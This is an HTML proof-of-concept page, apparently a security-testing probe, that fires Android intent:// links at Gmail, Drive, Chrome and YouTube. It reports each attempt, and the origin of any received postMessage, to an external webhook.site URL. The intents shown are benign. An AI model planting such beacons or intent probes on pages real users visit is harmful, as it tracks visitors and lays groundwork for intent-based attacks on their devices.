<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Google Apps Multi-Target PoC</title>
</head>
<body>
<h3>Testing Google Apps Intent:// & WebView</h3>

<script>
const WEBHOOK = "https://webhook.site/893cc168-9c2c-409a-9c79-771f7d62bf3d";

// Helper: lapor event ke server
function report(app, action, status) {
    const img = new Image();
    img.src = WEBHOOK + "?app=" + encodeURIComponent(app) 
                     + "&action=" + encodeURIComponent(action) 
                     + "&status=" + encodeURIComponent(status);
    console.log("Reported:", app, action, status);
}

// Daftar target apps & intent
const targets = [
    {
        app: "Gmail",
        intent: "intent://compose?to=test@example.com#Intent;scheme=mailto;package=com.google.android.gm;end"
    },
    {
        app: "Drive",
        intent: "intent://open?id=FILE_ID#Intent;scheme=https;package=com.google.android.apps.docs;end"
    },
    {
        app: "Chrome",
        intent: "intent://www.example.com#Intent;scheme=https;package=com.android.chrome;end"
    },
    {
        app: "YouTube",
        intent: "intent://watch?v=dQw4w9WgXcQ#Intent;scheme=https;package=com.google.android.youtube;end"
    }
];

// Coba trigger semua intents
targets.forEach(target => {
    try {
        window.location.href = target.intent;
        report(target.app, "intent_triggered", "attempted");
    } catch(e) {
        report(target.app, "intent_triggered", "error");
    }
});

// Optional: WebView / postMessage safe test
window.addEventListener("message", (evt) => {
    report("AllApps", "postMessage_received", evt.origin);
}, false);

</script>

<p>Check your webhook to see which intents fired.</p>
</body>
</html>
